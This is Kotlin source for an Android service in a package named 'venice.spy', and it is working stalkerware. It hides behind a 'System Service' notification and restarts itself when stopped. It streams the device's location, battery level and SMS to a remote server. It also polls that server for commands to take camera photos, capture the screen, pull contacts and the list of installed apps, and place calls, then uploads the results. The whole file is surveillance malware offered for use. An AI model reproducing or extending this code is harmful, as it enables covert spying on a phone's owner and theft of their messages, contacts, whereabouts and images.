package com.venice.spy

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import com.google.android.gms.location.*
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

class CoreService : Service() {

    companion object {
        private const val CH = "vspy"
        private const val NID = 4242
        @Volatile var running = false

        fun start(ctx: Context) {
            val i = Intent(ctx, CoreService::class.java)
            try {
                if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(i)
                else ctx.startService(i)
            } catch (_: Exception) {}
        }
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var prefs: Prefs
    private lateinit var fused: FusedLocationProviderClient
    private var lastLat = 0.0
    private var lastLng = 0.0

    override fun onBind(i: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        prefs = Prefs(this)
        running = true
        fused = LocationServices.getFusedLocationProviderClient(this)
        notify("Starting…")
        startLocation()
        scope.launch { registerDevice() }
        scope.launch { heartbeatLoop() }
        scope.launch { commandLoop() }
        scope.launch { smsLoop() }
    }

    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int = START_STICKY

    // ---------------- notification ----------------

    private fun notify(text: String) {
        if (Build.VERSION.SDK_INT >= 26) {
            val ch = NotificationChannel(CH, "Venice Spy", NotificationManager.IMPORTANCE_LOW)
            ch.setShowBadge(false)
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(ch)
        }
        val open = PendingIntent.getActivity(
            this, 0, Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)

        val n = NotificationCompat.Builder(this, CH)
            .setContentTitle("System Service")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .setContentIntent(open)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()

        val types = if (Build.VERSION.SDK_INT >= 29)
            ServiceInfo.LOCATION or ServiceInfo.DATA_SYNC or ServiceInfo.CAMERA else 0
        try {
            ServiceCompat.startForeground(this, NID, n, types)
        } catch (e: Exception) {
            try { ServiceCompat.startForeground(this, NID, n, ServiceInfo.DATA_SYNC) }
            catch (e2: Exception) { startForeground(NID, n) }
        }
    }

    // ---------------- location ----------------

    private fun startLocation() {
        try {
            val req = LocationRequest.Builder(Priority.PRIORITY_BALANCED_POWER_ACCURACY, 120_000L)
                .setMinUpdateDistanceMeters(25f)
                .build()
            fused.requestLocationUpdates(req, object : LocationCallback() {
                override fun onLocationResult(r: LocationResult) {
                    r.lastLocation?.let { pushLocation(it.latitude, it.longitude, it.accuracy.toDouble()) }
                }
            }, Looper.getMainLooper())
        } catch (_: SecurityException) {}
    }

    private fun pushLocation(lat: Double, lng: Double, acc: Double) {
        lastLat = lat; lastLng = lng
        Api.post("locations", JSONArray().put(JSONObject().apply {
            put("device_id", prefs.deviceId)
            put("lat", lat); put("lng", lng); put("accuracy", acc)
        }).toString())
    }

    private suspend fun oneShotLocation(): Pair<Double, Double>? {
        return try {
            val t = fused.lastLocation.awaitCompat() ?: return null
            pushLocation(t.latitude, t.longitude, t.accuracy.toDouble())
            t.latitude to t.longitude
        } catch (e: Exception) { null }
    }

    private suspend fun <T> com.google.android.gms.tasks.Task<T>.awaitCompat(): T? =
        withContext(Dispatchers.IO) {
            try {
                val l = java.util.concurrent.CountDownLatch(1)
                var res: T? = null
                addOnCompleteListener {
                    if (it.isSuccessful) res = it.result
                    l.countDown()
                }
                l.await(15, java.util.concurrent.TimeUnit.SECONDS)
                res
            } catch (e: Exception) { null }
        }

    // ---------------- loops ----------------

    private suspend fun registerDevice() {
        val j = Device.info(this)
        j.put("id", prefs.deviceId)
        j.put("owner_number", prefs.ownerNumber)
        j.put("last_seen", Sync.iso(System.currentTimeMillis()))
        Api.post("devices", JSONArray().put(j).toString(), "id")
        Api.post("events", JSONArray().put(JSONObject().apply {
            put("device_id", prefs.deviceId)
            put("kind", "online")
            put("message", "App started")
        }).toString())
    }

    private suspend fun heartbeatLoop() {
        while (true) {
            try {
                val j = JSONObject().apply {
                    put("id", prefs.deviceId)
                    put("battery", Device.battery(this@CoreService))
                    put("last_seen", Sync.iso(System.currentTimeMillis()))
                    put("owner_number", prefs.ownerNumber)
                    if (lastLat != 0.0) { put("lat", lastLat); put("lng", lastLng) }
                }
                Api.post("devices", JSONArray().put(j).toString(), "id")
            } catch (_: Exception) {}
            delay(60_000)
        }
    }

    private suspend fun smsLoop() {
        delay(5_000)
        while (true) {
            try { Sync.syncSms(this, prefs, full = false) } catch (_: Exception) {}
            delay(300_000)
        }
    }

    private suspend fun commandLoop() {
        while (true) {
            try {
                val raw = Api.get(
                    "commands?device_id=eq.${prefs.deviceId}&status=eq.pending&order=created_at.asc&limit=3")
                if (raw != null && raw.startsWith("[")) {
                    val arr = JSONArray(raw)
                    for (i in 0 until arr.length()) {
                        val o = arr.getJSONObject(i)
                        val id = o.getLong("id")
                        val cmd = o.optString("cmd")
                        val params = o.optJSONObject("params") ?: JSONObject()
                        Api.patch("commands?id=eq.$id", JSONObject()
                            .put("status", "running").toString())
                        val result = try { runCommand(cmd, params) } catch (e: Exception) {
                            "error: ${e.message}"
                        }
                        Api.patch("commands?id=eq.$id", JSONObject()
                            .put("status", "done")
                            .put("result", result)
                            .put("done_at", Sync.iso(System.currentTimeMillis())).toString())
                    }
                }
            } catch (_: Exception) {}
            delay(15_000)
        }
    }

    // ---------------- commands ----------------

    private suspend fun runCommand(cmd: String, p: JSONObject): String = when (cmd) {

        "photo" -> {
            val front = p.optString("cam") == "front"
            val f = File(cacheDir, "cam_${System.currentTimeMillis()}.jpg")
            if (!Cam.capture(this, f, front)) "camera failed"
            else {
                val url = Api.upload("${prefs.deviceId}/${f.name}", f, "image/jpeg")
                if (url != null) Sync.mediaRow(this, prefs, "photo", url, f.length())
                f.delete(); "ok"
            }
        }

        "screen" -> {
            val n = p.optInt("frames", 1)
            val files = ScreenCaptureService.capture(this, n)
            if (files.isEmpty()) "no projection grant"
            else {
                for (f in files) {
                    val url = Api.upload("${prefs.deviceId}/${f.name}", f, "image/jpeg")
                    if (url != null) Sync.mediaRow(this, prefs, "screen", url, f.length())
                    f.delete()
                }
                "ok ${files.size}"
            }
        }

        "location" -> {
            val r = oneShotLocation()
            if (r != null) "ok" else "no fix"
        }

        "sms_sync" -> { Sync.syncSms(this, prefs, full = p.optBoolean("full", false)); "ok" }
        "contacts" -> { Sync.syncContacts(this, prefs); "ok" }
        "apps" -> { Sync.syncApps(this, prefs); "ok" }

        "call" -> {
            val num = p.optString("number", prefs.ownerNumber)
            Actions.missCall(this, num)
            "calling $num"
        }

        "sync_all" -> {
            Sync.syncSms(this, prefs, full = true)
            Sync.syncContacts(this, prefs)
            Sync.syncApps(this, prefs)
            oneShotLocation()
            "ok"
        }

        else -> "unknown: $cmd"
    }

    override fun onDestroy() {
        running = false
        try { startService(Intent(this, CoreService::class.java)) } catch (_: Exception) {}
        super.onDestroy()
    }
}